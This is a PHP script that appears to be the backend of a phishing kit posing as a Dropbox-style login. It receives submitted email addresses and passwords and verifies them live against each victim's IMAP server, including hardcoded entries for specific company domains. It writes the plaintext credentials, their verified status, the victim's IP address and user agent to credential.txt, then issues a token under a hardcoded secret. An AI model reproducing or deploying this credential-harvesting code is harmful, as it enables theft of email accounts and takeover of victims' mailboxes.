<?php
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);
require 'vendor/autoload.php';

use Firebase\JWT\JWT;
use Firebase\JWT\Key;
// Helper function to get IMAP server by email domain
function get_imap_server($email)
{
    // Validate email
    if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        throw new InvalidArgumentException("Invalid email address");
    }

    $domain = strtolower(substr(strrchr($email, "@"), 1));

    // Known email providers with custom IMAP hosts
    $imap_hosts = [
        'gmail.com'              => '{imap.gmail.com:993/imap/ssl}INBOX',
        'yahoo.com'              => '{imap.mail.yahoo.com:993/imap/ssl}INBOX',
        'outlook.com'            => '{outlook.office365.com:993/imap/ssl}INBOX',
        'live.com'               => '{outlook.office365.com:993/imap/ssl}INBOX',
        'hotmail.com'            => '{outlook.office365.com:993/imap/ssl}INBOX',
        'aol.com'                => '{imap.aol.com:993/imap/ssl}INBOX',
        'att.net'                => '{imap.mail.att.net:993/imap/ssl}INBOX',
        '1and1.com'              => '{imap.1and1.com:993/imap/ssl}INBOX',
        'rackspace.com'          => '{imap.emailsrvr.com:993/imap/ssl}INBOX',
        'amazon.com'             => '{imap.mail.amazon.com:993/imap/ssl}INBOX',
        'comcast.net'            => '{imap.comcast.net:993/imap/ssl}INBOX',
        'coremail.com'           => '{imap.coremail.cn:993/imap/ssl}INBOX',
        'earthlink.net'          => '{imap.earthlink.net:993/imap/ssl}INBOX',
        'gmx.com'                => '{imap.gmx.com:993/imap/ssl}INBOX',
        'icloud.com'             => '{imap.mail.me.com:993/imap/ssl}INBOX',
        'mimecast.com'           => '{imap.mimecast.com:993/imap/ssl}INBOX',
        'namecheap.com'          => '{imap.privateemail.com:993/imap/ssl}INBOX',
        'networksolutions.com'   => '{imap.mail.networksolutionsemail.com:993/imap/ssl}INBOX',
        'protonmail.com'         => '{imap.protonmail.com:993/imap/ssl}INBOX',
        'office365.com'          => '{outlook.office365.com:993/imap/ssl}INBOX',
        'zimbra.com'             => '{imap.zimbra.com:993/imap/ssl}INBOX',
        'godaddy.com'            => '{imap.secureserver.net:993/imap/ssl}INBOX',
        'ev-lamborghini.com'     => '{mail.ev-lamborghini.com:993/imap/ssl}INBOX',
        'johnhurdslaw.com'       => '{outlook.office365.com:993/imap/ssl}INBOX',
    ];

    if (isset($imap_hosts[$domain])) {
        return $imap_hosts[$domain];
    }

    // Perform a DNS lookup to find the MX records for the domain
    $mx_records = dns_get_record($domain, DNS_MX);

    if (empty($mx_records)) {
        return null; // No MX records found, probably not a valid domain for email
    }

    // Sort MX records by priority
    usort($mx_records, function ($a, $b) {
        return $a['pri'] - $b['pri'];
    });

    // Log MX Records for debugging
    error_log('MX Records: ' . print_r($mx_records, true));

    // Determine the IMAP server based on common patterns
    $mx_host = $mx_records[0]['target'];

    // Logging selected MX host
    error_log('Selected MX Host: ' . $mx_host);

    // Default to the domain's MX host with common IMAP port and SSL
    return '{' . $mx_host . ':993/imap/ssl}INBOX';
}

// Validate email credentials using IMAP
function validate_credentials($email, $password)
{
    $imap_host = get_imap_server($email);

    if (!$imap_host) {
        return false;
    }

    // Clear previous errors
    imap_errors();
    imap_alerts();

    // Enable verbose debugging
    error_log("Trying to connect to IMAP server: $imap_host");

    // Try to connect to the IMAP server
    $imap_connection = @imap_open($imap_host, $email, $password, 0, 1);

    // Check if the connection was successful
    if ($imap_connection) {
        imap_close($imap_connection);
        return true;
    } else {
        // Analyze errors
        $errors = imap_errors();
        $alerts = imap_alerts();
        $last_error = imap_last_error();

        // Log errors for debugging
        error_log('IMAP Errors: ' . print_r($errors, true));
        error_log('IMAP Alerts: ' . print_r($alerts, true));
        error_log('IMAP Last Error: ' . $last_error);

        // Determine error type
        $existence_status = 'valid'; // Assume valid unless proven otherwise
        $password_status = 'invalid'; // Assume invalid unless proven otherwise

        if (is_array($errors)) {
            foreach ($errors as $error) {
                // Check for common errors related to non-existent email accounts
                if (preg_match('/no such user/i', $error) || preg_match('/unknown user/i', $error) || preg_match('/mailbox unavailable/i', $error) || preg_match('/does not exist/i', $error)) {
                    $existence_status = 'invalid';
                    $password_status = 'unknown';
                }

                // Check for authentication errors that suggest the password is incorrect
                if (preg_match('/authentication failed/i', $error) || preg_match('/auth/i', $error) || preg_match('/invalid credentials/i', $error) || preg_match('/login failed/i', $error)) {
                    $password_status = 'invalid';
                }

                // Specific error handling for certain providers
                if (strpos($imap_host, 'imap.gmail.com') !== false) {
                    if (preg_match('/not enabled/i', $error) || preg_match('/less secure/i', $error)) {
                        $existence_status = 'valid';
                        $password_status = 'unknown (less secure app access may be required)';
                    }
                }
            }
        }

        return false;
    }
}

// Function to log credentials and metadata
function log_attempt($email, $password, $isValid)
{
    // Get client IP address
    $clientIP = $_SERVER['REMOTE_ADDR'];

    // Get user agent
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    $credentialState = $isValid ? 'VERIFIED' : 'NON-VERIFIED';

    // Prepare log format
    $logEntry = "
|----------- INPUT RESULT --------------|
|----------| E M A I L  |--------------|
Email:          $email
pass:           $password
Credential:     $credentialState

|--------------- I N F O | I P -------------------|
|Client IP: $clientIP
|--- http://www.geoiptool.com/?IP=$clientIP ----
User-Agent: $userAgent
";

    // Write to credential.txt
    file_put_contents('credential.txt', $logEntry, FILE_APPEND);
}


function create_jwt($email)
{
    $key = "s3cR3tK3y@123!";
    $payload = [
        "iss" => "http://ssa.000.pe/dbx",
        "aud" => "http://ssa.000.pe/dbx",
        "iat" => time(),
        "nbf" => time(),
        "email" => $email
    ];

    return JWT::encode($payload, $key, 'HS256');
}

function save_token_to_file($token, $email)
{
    $session_dir = __DIR__ . '/sessions';
    if (!is_dir($session_dir)) {
        mkdir($session_dir, 0777, true);
    }

    $file_path = $session_dir . '/' . md5($email) . '.token';
    file_put_contents($file_path, $token);
}


// Set JSON header
header('Content-Type: application/json');

// Get POST data from the request
$data = json_decode(file_get_contents('php://input'), true);

// Check if JSON decoding was successful
if (json_last_error() !== JSON_ERROR_NONE) {
    echo json_encode(['valid' => false, 'message' => 'Invalid JSON data']);
    exit;
}

// Extract email and password from the received data
$email = filter_var($data['email'], FILTER_SANITIZE_EMAIL);
$password = $data['password'];

// Check for valid input
if ($email && $password) {

    // Validate credentials
    $isValid = validate_credentials($email, $password);

    // Log the attempt
    log_attempt($email, $password, $isValid);

    if ($isValid) {
        $token = create_jwt($email);
        save_token_to_file($token, $email);
        echo json_encode(['valid' => true, 'token' => $token, 'email' => md5($email) . '.token']);
    } else {
        echo json_encode(['valid' => false, 'message' => "Invalid Email or Password"]);
    }
} else {
    echo json_encode(['valid' => false, 'message' => "Invalid input"]);
}
